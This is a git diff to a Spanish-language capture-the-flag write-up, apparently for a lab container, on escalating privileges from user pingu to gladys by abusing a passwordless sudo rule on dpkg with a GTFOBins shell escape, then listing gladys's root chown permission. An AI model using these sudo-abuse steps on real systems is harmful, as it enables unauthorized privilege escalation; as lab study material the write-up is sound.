@@ -106,10 +106,42 @@ Dentro del manual podemos ejecutar la siguiente
 ```
 Vemos que nos mudamos de usuario y accedemos como pingu 
 
-![alt text](image.png)
+![alt text](Imagenes/Anon_5.png)
+
+Si ejecutamos la orden anterior vemos nuevos comandos que podemos ejecutar como el ususario gladys 
+
+```ruby
+Matching Defaults entries for pingu on 34882fa66e15:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User pingu may run the following commands on 34882fa66e15:
+    (gladys) NOPASSWD: /usr/bin/nmap
+    (gladys) NOPASSWD: /usr/bin/dpkg
+
+```
+
+Si vamos a la pagina de GTObins vemos que podemos explotarlar de la siguiente manera:
+
+```ruby
+sudo -u gladys dpkg -l
+!/bin/sh
+```
+
+Ganamos acceso con el usuario "gladys" de forma similar a la anterior.
+
+![alt text](Imagenes/Anon_6.png)
 
 
+Si volvemos a ejecutar el comando  `sudo -l` 
 
+```ruby
+Matching Defaults entries for gladys on 34882fa66e15:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
 
-
-
+User gladys may run the following commands on 34882fa66e15:
+    (root) NOPASSWD: /usr/bin/chown
+```
